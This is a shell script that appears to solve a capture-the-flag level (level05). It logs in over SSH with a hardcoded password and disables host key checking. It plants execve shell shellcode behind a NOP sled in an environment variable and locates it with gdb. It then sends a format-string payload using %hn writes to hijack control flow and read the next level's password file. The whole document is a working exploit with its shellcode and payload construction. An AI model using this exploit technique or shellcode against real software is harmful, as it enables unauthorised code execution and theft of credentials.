#!/bin/sh

PASS='3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN'
echo $PASS
echo $OVERRIDE
sshpass -p $PASS ssh -tt -o StrictHostKeyChecking=no level05@$OVERRIDE -p 4242 << EOF
export ARG1=0
export ARG2=0
export ADDSHELLCODE=0
export SHELLCODE=\$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"')
printf "file /home/users/level05/level05\nb *main\nrun\nx/100x *environ\nquit\ny" > /tmp/file.gdb
ADDSHELLCODE=\$(gdb -x /tmp/file.gdb -q -batch | grep "0x90909090" | sed -e '1,6d' | cut -c7-10)
ARG1=\$(echo \$((16#\$ADDSHELLCODE)) - 8 | bc)
ARG2=\$(echo 65535 - \$ARG1 - 8 | bc)
(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%' + str(\$ARG1) + 'c' + '%10\\\$hn'+ '%' + str(\$ARG2) + 'c' + '%11\\\$hn'"; echo 'cat /home/users/level06/.pass') | ./level05
exit
EOF